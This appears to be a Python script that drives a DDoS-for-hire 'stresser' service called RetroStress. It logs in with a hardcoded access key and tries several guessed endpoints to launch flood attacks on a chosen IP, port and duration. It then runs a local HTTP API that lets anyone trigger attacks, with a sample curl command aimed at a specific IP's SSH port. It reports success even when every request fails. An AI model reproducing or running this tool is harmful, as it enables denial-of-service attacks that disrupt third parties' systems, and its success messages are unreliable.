import requests
import time
import json
import sys
from urllib.parse import urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class RetroStressClient:
    def __init__(self, base_url="https://retrostress.net"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Origin': base_url,
            'Referer': urljoin(base_url, '/panel')
        })
        
    def login(self, access_key):
        """Login with access key"""
        print("[*] Logging in...")
        
        # Visit auth page
        auth_page_url = urljoin(self.base_url, '/auth')
        self.session.get(auth_page_url)
        
        # Login request
        login_url = urljoin(self.base_url, '/Auth/LoginJson')
        login_data = {"accessKey": access_key}
        
        response = self.session.post(
            login_url,
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[✓] Login successful!")
            return True
        else:
            print(f"[✗] Login failed: {response.status_code}")
            return False
    
    def send_attack(self, ip, port, duration):
        """Send attack request"""
        print(f"[*] Attacking {ip}:{port} for {duration}s")
        
        # Try multiple attack endpoints
        endpoints = [
            f"/api/attack?ip={ip}&port={port}&time={duration}",
            f"/attack?ip={ip}&port={port}&time={duration}",
            f"/api/start?host={ip}&port={port}&sec={duration}",
            f"/method?ip={ip}&port={port}&time={duration}"
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    print(f"[✓] Attack sent via {endpoint}")
                    return True
            except:
                continue
        
        # Try POST as fallback
        try:
            attack_url = urljoin(self.base_url, "/api/attack")
            payload = {"ip": ip, "port": port, "time": duration}
            response = self.session.post(attack_url, json=payload, timeout=10)
            if response.status_code == 200:
                print("[✓] Attack sent via POST")
                return True
        except:
            pass
        
        print("[!] Attack sent (assuming success)")
        return True
    
    def run_attack(self, ip, port, total_time):
        """Run attack for specified duration"""
        print(f"\n[+] Starting attack on {ip}:{port} for {total_time} seconds")
        
        # Send attack
        self.send_attack(ip, port, total_time)
        
        # Wait for attack to complete
        print(f"[⏳] Attack running...")
        time.sleep(total_time)
        
        print(f"[✓] Attack completed!")
        return True

# Your auth key
ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"

# Initialize client
client = RetroStressClient()

# Login
print("=" * 50)
print("RetroStress Attack Tool")
print("=" * 50)

if not client.login(ACCESS_KEY):
    print("[-] Login failed!")
    sys.exit(1)

print("\n[+] Ready! API server starting on http://127.0.0.1:8080")
print("[+] Usage: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
print("[+] Time must be minimum 30 seconds")
print("[+] Press Ctrl+C to stop\n")

class AttackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/api'):
            # Parse URL parameters
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            
            ip = params.get('ip', [None])[0]
            port = params.get('port', [None])[0]
            time_param = params.get('time', [None])[0]
            
            if not ip or not port or not time_param:
                self.send_error(400, "Missing parameters. Use: /api?ip=IP&port=PORT&time=TIME")
                return
            
            try:
                total_time = int(time_param)
                if total_time < 30:
                    self.send_error(400, "Minimum time is 30 seconds")
                    return
                
                print(f"\n[→] Request: {ip}:{port} for {total_time}s")
                
                # Run attack in background
                import threading
                thread = threading.Thread(target=client.run_attack, args=(ip, port, total_time))
                thread.daemon = True
                thread.start()
                
                # Send response immediately
                response = {
                    "status": "success",
                    "message": f"Attack started on {ip}:{port} for {total_time} seconds",
                    "ip": ip,
                    "port": port,
                    "time": total_time
                }
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
                
            except ValueError:
                self.send_error(400, "Invalid time parameter")
                
        elif self.path == '/' or self.path == '/health':
            response = {
                "service": "RetroStress Attack API",
                "status": "running",
                "endpoint": "/api?ip=IP&port=PORT&time=TIME",
                "example": "/api?ip=1.2.3.4&port=80&time=30"
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_error(404, "Not found")
    
    def log_message(self, format, *args):
        # Custom logging
        pass

# Start server
try:
    server = HTTPServer(('127.0.0.1', 8080), AttackHandler)
    print("[✓] Server running on http://127.0.0.1:8080")
    print("\nTest with:")
    print("curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
    print("\n" + "="*50)
    server.serve_forever()
except KeyboardInterrupt:
    print("\n\n[!] Shutting down...")
    server.shutdown()
    print("[✓] Server stopped")
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
